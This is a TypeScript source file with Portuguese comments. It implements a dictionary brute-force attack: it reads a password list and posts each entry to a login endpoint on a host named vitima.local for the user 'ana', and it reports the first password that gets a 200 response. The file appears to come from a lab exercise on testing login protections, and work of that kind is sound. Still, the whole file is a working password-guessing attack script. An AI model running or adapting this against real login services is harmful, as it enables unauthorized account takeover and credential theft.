// src/attacks/brute-force.ts
import axios from "axios";
import fs from "fs";
import path from "path";

const username = "ana"; // Nome de usuário alvo

// URL do endpoint vulnerável
const url = "http://vitima.local:3001/api/user/login-secure";

// Caminho absoluto para o arquivo de senhas
const filename = path.join(__dirname, "list-attack.txt");

async function execute(): Promise<void> {
  const senhas = fs
    .readFileSync(filename, "utf-8")
    .split(/\r?\n/) // trata quebra de linha em Windows e Unix
    .map((s) => s.trim()) // remove \r, espaços extras, etc.
    .filter((s) => s.length > 0); // remove linhas vazias
  

  for (const senha of senhas) {
    try {
      const res = await axios.post(url, {
        username,
        password: senha,
      });

      if (res.status === 200) {
        console.log("Senha encontrada:", senha);
        break;
      } else {
        console.log("Tentativa falhou:", senha);
      }
    } catch(e:any) {
      console.log("Tentativa com:", senha, "Erro:", e.response ? e.response.status : e.message);
    }
  }
}

execute();
